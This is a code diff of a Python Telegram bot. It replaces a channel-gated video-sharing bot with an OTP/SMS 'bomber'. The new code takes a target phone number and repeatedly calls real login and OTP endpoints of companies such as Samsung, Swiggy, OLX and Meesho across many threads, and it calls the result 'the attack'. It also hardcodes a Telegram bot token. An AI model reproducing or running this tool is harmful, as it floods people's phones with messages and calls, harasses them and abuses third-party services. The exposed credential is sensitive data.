@@ -1,464 +1,348 @@
-import os
 import logging
-from datetime import datetime, timedelta
-from collections import defaultdict
 import asyncio
+import requests
+import time
+import threading
+import json
+import math
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
-from telegram.ext import (
-    Application,
-    CommandHandler,
-    CallbackQueryHandler,
-    ContextTypes,
-    MessageHandler,
-    filters
-)
+from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
 
-# Configuration
-BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '7714765260:AAG4yiN5_ow25-feUeKslR2xsdeMFuPllGg')
-CHANNEL_ID = -1002441094491  # Channel where videos are stored
-VERIFICATION_CHANNEL_ID = -1002512368825  # Channel users must join
-ADMIN_IDS = {8167507955}  # Admin user IDs
-DELETE_AFTER_SECONDS = 14400  # Auto-delete messages after 4 hours
-MAX_CONCURRENT_TASKS = 10  # Limit concurrent video sending tasks per user
-MAX_DELETE_RETRIES = 3  # Max attempts to delete a message
+BOT_TOKEN = "7714765260:AAG4yiN5_ow25-feUeKslR2xsdeMFuPllGg"
+CHANNEL_ID = -1002512368825  # Replace with your actual channel ID
 
-# Store user progress and bot data
-user_progress = defaultdict(dict)
-bot_start_time = datetime.now()
-total_users = 0
-blocked_users = set()
-sent_messages = defaultdict(list)  # {user_id: [(chat_id, message_id, delete_task), ...]}
-user_stats = defaultdict(dict)  # {user_id: {'first_seen': datetime, 'last_active': datetime, 'video_count': int}}
-user_tasks = defaultdict(list)  # Track active tasks per user
-task_semaphores = defaultdict(asyncio.Semaphore)  # Limit concurrent tasks per user
+logging.basicConfig(level=logging.INFO)
 
-# Set up logging
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
-logger = logging.getLogger(__name__)
+# Global counters for the bomber
+message_count = 0
+api_counters = {}
+api_repeats = {}  # Tracks how many times each API has repeated
+count_lock = threading.Lock()
+start_time = 0
+bomber_active = False
 
-# Global application reference for cleanup tasks
-application = None
+# API configurations
+api_configurations = [
+    # POST APIs (40 second interval)
+    {
+        'name': 'Samsung OTP',
+        'url': 'https://www.samsung.com/in/api/v1/sso/otp/init',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"user_id": n}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    {
+        'name': 'More Retail Login',
+        'url': 'https://omni-api.moreretail.in/api/v1/login/',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"hash_key": "XfsoCeXADQA", "phone_number": n}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    {
+        'name': 'Swiggy Call Verify',
+        'url': 'https://profile.swiggy.com/api/v3/app/request_call_verification',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"mobile": n}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    {
+        'name': 'OLX Authentication',
+        'url': 'https://www.olx.in/api/auth/authenticate?lang=en-IN',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"method": "call", "phone": f"+91{n}", "language": "en-IN", "grantType": "retry"}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    {
+        'name': 'PropTiger Login',
+        'url': 'https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"contactNumber": n, "domainId": "2"}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    {
+        'name': 'ForexWin OTP',
+        'url': 'https://api.forexwin.co/api/sendOtp',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"phone": n}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    {
+        'name': 'DocTime OTP',
+        'url': 'https://admin.doctime.com.bd/api/otp/send',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"contact": n}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    {
+        'name': 'Doubtnut Login',
+        'url': 'https://api.doubtnut.com/v4/student/login',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"is_web": "3", "phone_number": n}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    {
+        'name': 'Trinkerr OTP',
+        'url': 'https://prod-backend.trinkerr.com/api/v1/web/traders/generateOtpForLogin',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"mobile": n, "otpOperationType": "SignUp"}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    {
+        'name': 'Meesho OTP',
+        'url': 'https://www.meesho.com/api/v1/user/login/request-otp',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"phone_number": n}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    {
+        'name': 'TLLMS OTP',
+        'url': 'https://identity.tllms.com/api/request_otp',
+        'method': 'POST',
+        'data': lambda n: json.dumps({"feature": "", "phone": f"+91{n}", "type": "sms", "app_client_id": "null"}),
+        'headers': {'Content-Type': 'application/json'},
+        'interval': 40,
+        'threads': 1
+    },
+    # GET APIs (45 second interval)
+    {
+        'name': 'Glonova Lookup',
+        'url': 'https://glonova.in/',
+        'method': 'GET',
+        'params': lambda n: {'mobile': n},
+        'interval': 45,
+        'threads': 1
+    },
+    # Booming API (continuous)
+    {
+        'name': 'Booming API',
+        'url': 'https://booming-api.vercel.app/',
+        'method': 'GET',
+        'params': lambda n: {'number': n},
+        'interval': 0.5,
+        'threads': 'user_defined'
+    }
+]
 
-async def delete_message_with_retry(chat_id: int, message_id: int):
-    """Delete a message with retry logic"""
-    for attempt in range(MAX_DELETE_RETRIES):
+def api_request_loop(api_config, number, thread_id=None):
+    global message_count, api_counters, api_repeats, bomber_active
+    api_name = api_config['name']
+    
+    with count_lock:
+        if api_name not in api_counters:
+            api_counters[api_name] = 0
+            api_repeats[api_name] = 0
+    
+    while bomber_active:
         try:
-            await application.bot.delete_message(chat_id=chat_id, message_id=message_id)
-            logger.info(f"Successfully deleted message {message_id} in chat {chat_id}")
-            return True
-        except Exception as e:
-            logger.warning(f"Attempt {attempt + 1} failed to delete message {message_id}: {e}")
-            if attempt < MAX_DELETE_RETRIES - 1:
-                await asyncio.sleep(2)  # Wait before retrying
-    return False
-
-async def delete_message_after_delay(chat_id: int, message_id: int, delay: int):
-    """Delete a message after specified delay with proper error handling"""
-    try:
-        await asyncio.sleep(delay)
-        await delete_message_with_retry(chat_id, message_id)
-    except Exception as e:
-        logger.error(f"Failed in delete_message_after_delay for message {message_id}: {e}")
-
-async def cleanup_user_messages(user_id: int):
-    """Cleanup all scheduled messages for a user"""
-    if user_id in sent_messages:
-        for chat_id, message_id, delete_task in sent_messages[user_id]:
-            try:
-                if not delete_task.done():
-                    delete_task.cancel()
-                await delete_message_with_retry(chat_id, message_id)
-            except Exception as e:
-                logger.error(f"Failed to cleanup message {message_id} for user {user_id}: {e}")
-        sent_messages[user_id].clear()
-
-async def cleanup_user_tasks(user_id: int):
-    """Cancel all active tasks for a user"""
-    if user_id in user_tasks:
-        for task in user_tasks[user_id]:
-            if not task.done():
-                task.cancel()
-                try:
-                    await task
-                except asyncio.CancelledError:
-                    pass
-                except Exception as e:
-                    logger.error(f"Error in cancelled task for user {user_id}: {e}")
-        user_tasks[user_id].clear()
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user = update.effective_user
-    if user.id in blocked_users:
-        await update.message.reply_text("🚫 You are blocked from using this bot.")
-        return
-    
-    global total_users
-    if user.id not in user_stats:
-        total_users += 1
-        user_stats[user.id] = {
-            'first_seen': datetime.now(),
-            'last_active': datetime.now(),
-            'video_count': 0,
-            'username': user.username,
-            'full_name': user.full_name
-        }
-    else:
-        user_stats[user.id]['last_active'] = datetime.now()
-    
-    # Initialize semaphore for this user if not exists
-    if user.id not in task_semaphores:
-        task_semaphores[user.id] = asyncio.Semaphore(MAX_CONCURRENT_TASKS)
-    
-    # Notify admin about new user
-    asyncio.create_task(notify_admin(context.bot, f"👤 New user:\nID: {user.id}\nUsername: @{user.username}\nName: {user.full_name}"))
-    
-    welcome_text = """
-🎬 <b>Welcome to Video Bot!</b> 🎥
-
-Here you can get access to our exclusive video collection.
-
-⚠️ <b>Important:</b> Videos are protected content and cannot be saved or forwarded.
-
-Please join our channels first to use this bot:
-"""
-    keyboard = [
-        [
-            InlineKeyboardButton("Channel 1", url="https://t.me/+RhlQLyOfQ48xMjI1"),
-            InlineKeyboardButton("Channel 2", url="https://t.me/+ZyYHoZg-qL0zN2Nl"),
-            InlineKeyboardButton("Channel 3", url="https://t.me/DARKMETHODHUB")
-        ],
-        [InlineKeyboardButton("✅ I've Joined", callback_data='check_join')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    # Send welcome message with photo
-    sent_message = await update.message.reply_photo(
-        photo="https://t.me/bshshsubjsus/4",
-        caption=welcome_text,
-        reply_markup=reply_markup,
-        parse_mode='HTML'
-    )
-    
-    # Schedule welcome message deletion
-    delete_task = asyncio.create_task(delete_message_after_delay(sent_message.chat_id, sent_message.message_id, DELETE_AFTER_SECONDS))
-    sent_messages[user.id].append((sent_message.chat_id, sent_message.message_id, delete_task))
-
-async def notify_admin(bot, message: str):
-    for admin_id in ADMIN_IDS:
-        try:
-            await bot.send_message(chat_id=admin_id, text=message)
-        except Exception as e:
-            logger.error(f"Failed to notify admin {admin_id}: {e}")
-
-async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    query = update.callback_query
-    await query.answer()
-    user_id = query.from_user.id
-    
-    if user_id in blocked_users:
-        await query.edit_message_text(text="🚫 You are blocked from using this bot.")
-        return
-
-    if query.data == 'check_join':
-        try:
-            chat_member = await context.bot.get_chat_member(VERIFICATION_CHANNEL_ID, user_id)
-            if chat_member.status in ['member', 'administrator', 'creator']:
-                keyboard = [[InlineKeyboardButton("Get Videos", callback_data='videos')]]
-                reply_markup = InlineKeyboardMarkup(keyboard)
-                await query.edit_message_caption(
-                    caption="✅ Thanks for joining! Click below to get videos:\n\n⚠️ Note: Videos are protected and cannot be saved or forwarded.",
-                    reply_markup=reply_markup
+            if api_config['method'] == 'POST':
+                response = requests.post(
+                    api_config['url'],
+                    data=api_config['data'](number),
+                    headers=api_config.get('headers', {}),
+                    timeout=10
                 )
             else:
-                await query.edit_message_caption(caption="❌ Please join all channels first to access videos.")
+                response = requests.get(
+                    api_config['url'],
+                    params=api_config['params'](number),
+                    headers=api_config.get('headers', {}),
+                    timeout=10
+                )
+            
+            with count_lock:
+                message_count += 1
+                api_counters[api_name] += 1
+                # Increment repeat counter when count crosses 100
+                if api_counters[api_name] % 100 == 0:
+                    api_repeats[api_name] += 1
+                
         except Exception as e:
-            logger.error(f"Error checking membership: {e}")
-            await query.edit_message_caption(caption="⚠️ Couldn't verify your channel membership. Please try again /start.")
-    
-    elif query.data == 'videos':
-        user_progress[user_id]['last_sent'] = 0
-        asyncio.create_task(send_batch(context.bot, user_id, query.message.chat.id))
-    
-    elif query.data == 'next':
-        asyncio.create_task(send_batch(context.bot, user_id, query.message.chat.id))
-
-async def send_video_task(bot, user_id, chat_id, msg_id):
-    """Task to send a single video with error handling and content protection"""
-    try:
-        async with task_semaphores[user_id]:
-            sent_message = await bot.copy_message(
-                chat_id=chat_id,
-                from_chat_id=CHANNEL_ID,
-                message_id=msg_id,
-                disable_notification=True,
-                protect_content=True  # This prevents saving/forwarding
-            )
-            
-            # Update user video count
-            if user_id in user_stats:
-                user_stats[user_id]['video_count'] = user_stats[user_id].get('video_count', 0) + 1
-            
-            # Schedule video deletion with proper tracking
-            delete_task = asyncio.create_task(delete_message_after_delay(chat_id, sent_message.message_id, DELETE_AFTER_SECONDS))
-            sent_messages[user_id].append((chat_id, sent_message.message_id, delete_task))
-            
-            # Small delay between videos
-            await asyncio.sleep(0.3)
-            return True
-    except Exception as e:
-        logger.error(f"Failed to copy message {msg_id} for user {user_id}: {e}")
-        return False
-
-async def send_batch(bot, user_id, chat_id):
-    if user_id not in user_progress or 'last_sent' not in user_progress[user_id]:
-        user_progress[user_id]['last_sent'] = 0
-    
-    start_msg = user_progress[user_id]['last_sent']
-    end_msg = start_msg + 50
-    sent_count = 0
-    
-    # Create tasks for sending videos
-    tasks = []
-    for msg_id in range(start_msg + 1, end_msg + 1):
-        task = asyncio.create_task(send_video_task(bot, user_id, chat_id, msg_id))
-        tasks.append(task)
-        user_tasks[user_id].append(task)
-    
-    # Wait for all tasks to complete
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    
-    # Count successful sends
-    sent_count = sum(1 for result in results if result is True)
-    
-    # Clean up completed tasks
-    user_tasks[user_id] = [t for t in user_tasks[user_id] if not t.done()]
-    
-    if sent_count > 0:
-        user_progress[user_id]['last_sent'] = end_msg
-        keyboard = [[InlineKeyboardButton("Next", callback_data='next')]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        control_message = await bot.send_message(
-            chat_id=chat_id,
-            text=f"Sent {sent_count} protected videos (will auto-delete in {DELETE_AFTER_SECONDS//60} mins).",
-            reply_markup=reply_markup
-        )
-        # Schedule control message deletion with tracking
-        delete_task = asyncio.create_task(delete_message_after_delay(chat_id, control_message.message_id, DELETE_AFTER_SECONDS))
-        sent_messages[user_id].append((chat_id, control_message.message_id, delete_task))
-    else:
-        error_message = await bot.send_message(
-            chat_id=chat_id,
-            text="No more videos available or failed to send."
-        )
-        # Schedule error message deletion with tracking
-        delete_task = asyncio.create_task(delete_message_after_delay(chat_id, error_message.message_id, DELETE_AFTER_SECONDS))
-        sent_messages[user_id].append((chat_id, error_message.message_id, delete_task))
-
-# Admin commands
-async def status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if update.effective_user.id not in ADMIN_IDS:
-        return
-    
-    uptime = datetime.now() - bot_start_time
-    days, seconds = uptime.days, uptime.seconds
-    hours = seconds // 3600
-    minutes = (seconds % 3600) // 60
-    seconds = seconds % 60
-    
-    total_videos = sum(stats.get('video_count', 0) for stats in user_stats.values())
-    
-    status_text = (
-        f"🤖 <b>Bot Status</b>\n\n"
-        f"⏳ <b>Uptime:</b> {days}d {hours}h {minutes}m {seconds}s\n"
-        f"👥 <b>Total Users:</b> {total_users}\n"
-        f"📊 <b>Active Users:</b> {len(user_progress)}\n"
-        f"🚫 <b>Blocked Users:</b> {len(blocked_users)}\n"
-        f"🎬 <b>Total Videos Sent:</b> {total_videos}\n"
-        f"🔒 <b>Content Protection:</b> Enabled\n"
-        f"📅 <b>Last Start:</b> {bot_start_time.strftime('%Y-%m-%d %H:%M:%S')}"
-    )
-    
-    await update.message.reply_text(status_text, parse_mode='HTML')
-
-async def block_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if update.effective_user.id not in ADMIN_IDS:
-        return
-    
-    if not context.args:
-        await update.message.reply_text("Usage: /block <user_id>")
-        return
-    
-    try:
-        user_id = int(context.args[0])
-        blocked_users.add(user_id)
-        await cleanup_user_messages(user_id)
-        await cleanup_user_tasks(user_id)
-        await update.message.reply_text(f"✅ User {user_id} has been blocked.")
-    except ValueError:
-        await update.message.reply_text("Invalid user ID. Please provide a numeric ID.")
-
-async def unblock_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if update.effective_user.id not in ADMIN_IDS:
-        return
-    
-    if not context.args:
-        await update.message.reply_text("Usage: /unblock <user_id>")
-        return
-    
-    try:
-        user_id = int(context.args[0])
-        if user_id in blocked_users:
-            blocked_users.remove(user_id)
-            await update.message.reply_text(f"✅ User {user_id} has been unblocked.")
-        else:
-            await update.message.reply_text(f"User {user_id} is not blocked.")
-    except ValueError:
-        await update.message.reply_text("Invalid user ID. Please provide a numeric ID.")
-
-async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if update.effective_user.id not in ADMIN_IDS:
-        return
-    
-    if not context.args:
-        await update.message.reply_text("Usage: /broadcast <message>")
-        return
-    
-    message = ' '.join(context.args)
-    success = 0
-    failed = 0
-    
-    for user_id in user_progress:
-        try:
-            await context.bot.send_message(chat_id=user_id, text=message)
-            success += 1
-            await asyncio.sleep(0.1)  # Rate limiting
-        except Exception as e:
-            logger.error(f"Failed to send broadcast to {user_id}: {e}")
-            failed += 1
-    
-    await update.message.reply_text(
-        f"📢 Broadcast completed:\n"
-        f"✅ Success: {success}\n"
-        f"❌ Failed: {failed}"
-    )
-
-async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """List all users with their details"""
-    if update.effective_user.id not in ADMIN_IDS:
-        return
-    
-    if not user_stats:
-        await update.message.reply_text("No users found.")
-        return
-    
-    message = "👥 <b>User List</b>:\n\n"
-    for user_id, stats in user_stats.items():
-        first_seen = stats.get('first_seen', datetime.now())
-        last_active = stats.get('last_active', datetime.now())
-        usage_time = last_active - first_seen
-        days = usage_time.days
-        hours, remainder = divmod(usage_time.seconds, 3600)
-        minutes, _ = divmod(remainder, 60)
-        
-        message += (
-            f"🆔 <b>ID</b>: {user_id}\n"
-            f"👤 <b>Name</b>: {stats.get('full_name', 'N/A')}\n"
-            f"📛 <b>Username</b>: @{stats.get('username', 'N/A')}\n"
-            f"⏱ <b>Usage Time</b>: {days}d {hours}h {minutes}m\n"
-            f"🎬 <b>Videos Watched</b>: {stats.get('video_count', 0)}\n"
-            f"📅 <b>First Seen</b>: {first_seen.strftime('%Y-%m-%d %H:%M')}\n"
-            f"🔍 <b>Last Active</b>: {last_active.strftime('%Y-%m-%d %H:%M')}\n"
-            f"🚫 <b>Blocked</b>: {'Yes' if user_id in blocked_users else 'No'}\n"
-            f"────────────────────\n"
-        )
-    
-    # Telegram has a message length limit, so we might need to split
-    if len(message) > 4096:
-        parts = [message[i:i+4096] for i in range(0, len(message), 4096)]
-        for part in parts:
-            await update.message.reply_text(part, parse_mode='HTML')
-            await asyncio.sleep(0.5)
-    else:
-        await update.message.reply_text(message, parse_mode='HTML')
-
-async def user_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Show statistics about user activity"""
-    if update.effective_user.id not in ADMIN_IDS:
-        return
-    
-    if not user_stats:
-        await update.message.reply_text("No user statistics available.")
-        return
-    
-    total_videos = sum(stats.get('video_count', 0) for stats in user_stats.values())
-    active_users = len([uid for uid in user_stats if uid not in blocked_users])
-    avg_videos = total_videos / len(user_stats) if len(user_stats) > 0 else 0
-    
-    # Find top users by video count
-    top_users = sorted(
-        [(uid, stats) for uid, stats in user_stats.items()],
-        key=lambda x: x[1].get('video_count', 0),
-        reverse=True
-    )[:5]
-    
-    message = (
-        f"📊 <b>User Statistics</b>\n\n"
-        f"👥 <b>Total Users</b>: {len(user_stats)}\n"
-        f"🔄 <b>Active Users</b>: {active_users}\n"
-        f"🚫 <b>Blocked Users</b>: {len(blocked_users)}\n"
-        f"🎬 <b>Total Videos Sent</b>: {total_videos}\n"
-        f"📈 <b>Average Videos per User</b>: {avg_videos:.1f}\n\n"
-        f"🏆 <b>Top Users by Video Count</b>:\n"
-    )
-    
-    for i, (user_id, stats) in enumerate(top_users, 1):
-        message += (
-            f"{i}. {stats.get('full_name', 'N/A')} (@{stats.get('username', 'N/A')})\n"
-            f"   🆔: {user_id} | 🎬: {stats.get('video_count', 0)}\n"
-        )
-    
-    await update.message.reply_text(message, parse_mode='HTML')
-
-async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
-    logger.error(msg="Exception while handling an update:", exc_info=context.error)
-    
-    if update and hasattr(update, 'effective_user'):
-        user_id = update.effective_user.id
-        try:
-            error_message = await context.bot.send_message(
-                chat_id=user_id,
-                text="Sorry, an error occurred. Please try again later."
-            )
-            # Schedule error message deletion
-            asyncio.create_task(delete_message_after_delay(error_message.chat_id, error_message.message_id, DELETE_AFTER_SECONDS))
-        except Exception:
             pass
+        
+        time.sleep(api_config['interval'])
 
-def main() -> None:
-    global application
-    application = Application.builder().token(BOT_TOKEN).build()
+def start_bomber(number, boom_threads):
+    global bomber_active, start_time, message_count, api_counters, api_repeats
     
-    # User commands
-    application.add_handler(CommandHandler('start', start))
-    application.add_handler(CallbackQueryHandler(button))
+    # Reset counters
+    bomber_active = True
+    start_time = time.time()
+    message_count = 0
+    api_counters = {}
+    api_repeats = {}
     
-    # Admin commands
-    application.add_handler(CommandHandler('status', status))
-    application.add_handler(CommandHandler('block', block_user))
-    application.add_handler(CommandHandler('unblock', unblock_user))
-    application.add_handler(CommandHandler('broadcast', broadcast))
-    application.add_handler(CommandHandler('users', list_users))
-    application.add_handler(CommandHandler('stats', user_stats_command))
+    # Start display thread
+    display_thread = threading.Thread(target=display_counters, daemon=True)
+    display_thread.start()
     
-    # Error handler
-    application.add_error_handler(error_handler)
-    
-    # Start the bot
-    application.run_polling(drop_pending_updates=True)
+    # Start API threads
+    for config in api_configurations:
+        threads = boom_threads if config['threads'] == 'user_defined' else config['threads']
+        for i in range(threads):
+            t = threading.Thread(
+                target=api_request_loop,
+                args=(config, number, i+1),
+                daemon=True
+            )
+            t.start()
 
+def stop_bomber():
+    global bomber_active
+    bomber_active = False
+
+def display_counters():
+    global message_count, api_counters, api_repeats, start_time, bomber_active
+    while bomber_active:
+        with count_lock:
+            current_total = message_count
+            current_api_counts = api_counters.copy()
+            current_repeats = api_repeats.copy()
+        
+        runtime = time.time() - start_time
+        output = f"📊 TOTAL REQUESTS: {current_total:,} ({current_total/max(1,runtime):.1f}/sec)\n"
+        output += f"⏱️ Runtime: {runtime:.1f}s\n\n"
+        output += "🔹 ACTIVE API THREADS:\n"
+        
+        for api_name in sorted(current_api_counts.keys()):
+            count = current_api_counts[api_name]
+            repeat = current_repeats.get(api_name, 0)
+            output += f"  {api_name.ljust(20)}: {count:,} (Repeat: {repeat})\n"
+        
+        print(output)  # For debugging, you can remove this
+        time.sleep(5)
+
+# /start handler
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = [
+        [InlineKeyboardButton("Join Channel", url="https://t.me/+RhlQLyOfQ48xMjI1")],
+        [InlineKeyboardButton("Check Join", callback_data="check_join")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_photo(
+        photo="https://t.me/bshshsubjsus/4",
+        caption="Welcome! Please join the channel to continue.",
+        reply_markup=reply_markup
+    )
+
+# Button press handler
+async def check_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    await query.answer()
+
+    try:
+        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
+        if member.status in ['member', 'administrator', 'creator']:
+            # User has joined, show bomber button
+            keyboard = [[InlineKeyboardButton("🚀 Start Bomber", callback_data="start_bomber")]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await query.edit_message_caption(
+                caption="✅ You have joined the channel. Click below to start the bomber!",
+                reply_markup=reply_markup
+            )
+        else:
+            await query.edit_message_caption(caption="❌ You haven't joined the channel yet.")
+    except Exception as e:
+        await query.edit_message_caption(caption="⚠️ Error checking your join status.")
+
+# Start bomber handler
+async def start_bomber_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    # Ask for phone number
+    await query.edit_message_caption(
+        caption="Please send the target phone number (without +91 or 0):"
+    )
+    
+    # Store the state that we're waiting for a phone number
+    context.user_data['awaiting_phone_number'] = True
+
+# Handle phone number input
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if 'awaiting_phone_number' in context.user_data and context.user_data['awaiting_phone_number']:
+        phone_number = update.message.text
+        
+        # Validate phone number
+        if not phone_number.isdigit() or len(phone_number) != 10:
+            await update.message.reply_text("Invalid phone number. Please send a 10-digit number (without +91 or 0).")
+            return
+        
+        # Ask for number of threads
+        await update.message.reply_text(
+            "How many threads for the Booming API? (1-20 recommended):",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("5", callback_data=f"threads_5_{phone_number}")],
+                [InlineKeyboardButton("10", callback_data=f"threads_10_{phone_number}")],
+                [InlineKeyboardButton("15", callback_data=f"threads_15_{phone_number}")],
+                [InlineKeyboardButton("20", callback_data=f"threads_20_{phone_number}")]
+            ])
+        )
+        
+        # Clear the state
+        context.user_data['awaiting_phone_number'] = False
+
+# Handle thread selection
+async def handle_thread_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    # Parse the callback data
+    data = query.data.split('_')
+    threads = int(data[1])
+    phone_number = data[2]
+    
+    # Start the bomber
+    start_bomber(phone_number, threads)
+    
+    # Send confirmation
+    await query.edit_message_text(
+        f"🚀 Bomber started on {phone_number} with {threads} threads!\n\n"
+        "The attack is running in the background. To stop, use /stopbomber."
+    )
+
+# Stop bomber command
+async def stop_bomber_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    stop_bomber()
+    await update.message.reply_text("🛑 Bomber stopped successfully!")
+
+# Main function
+async def main():
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
+    
+    # Add handlers
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("stopbomber", stop_bomber_command))
+    app.add_handler(CallbackQueryHandler(check_join, pattern="check_join"))
+    app.add_handler(CallbackQueryHandler(start_bomber_handler, pattern="start_bomber"))
+    app.add_handler(CallbackQueryHandler(handle_thread_selection, pattern="^threads_"))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    
+    print("Bot is running...")
+    await app.run_polling()
+
+# Run the bot
 if __name__ == '__main__':
-    main()
+    import nest_asyncio
+    nest_asyncio.apply()
+    asyncio.run(main())
